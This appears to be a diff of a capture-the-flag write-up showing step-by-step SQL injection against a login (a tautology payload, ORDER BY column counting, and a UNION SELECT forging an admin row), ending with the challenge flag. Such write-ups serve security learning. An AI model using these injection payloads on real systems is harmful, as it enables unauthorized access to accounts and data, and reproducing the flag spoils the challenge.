@@ -1,10 +1,19 @@
-Query for table length:
+1. Get a valid username
 
-' OR 1=1 limit 1 -- GIVES US USERNAME "michael"
+QUERY$ ' OR 1=1 limit 1 --
+>> "michael"
 
-michael' ORDER BY 3 -- RETURNS TRUE
-michael' ORDER BY 4 -- RETURNS FALSE
+2. Get length of rows:
 
-' UNION SELECT 0, "admin", "" LIMIT 1 -- 
+QUERY$ michael' ORDER BY 3 --
+>> TRUE
+QUERY$ michael' ORDER BY 4 --
+>> FALSE
+=> num_columns = 3
 
-Welcome, admin! Your flag is easyctf{54771309-67e5-4704-8743-6981a40b}.
+3. Create "bogus" admin user:
+
+QUERY$ ' UNION SELECT 0, "admin", "" LIMIT 1 --
+>> Welcome, admin! Your flag is easyctf{54771309-67e5-4704-8743-6981a40b}.
+
+FLAG: easyctf{54771309-67e5-4704-8743-6981a40b}
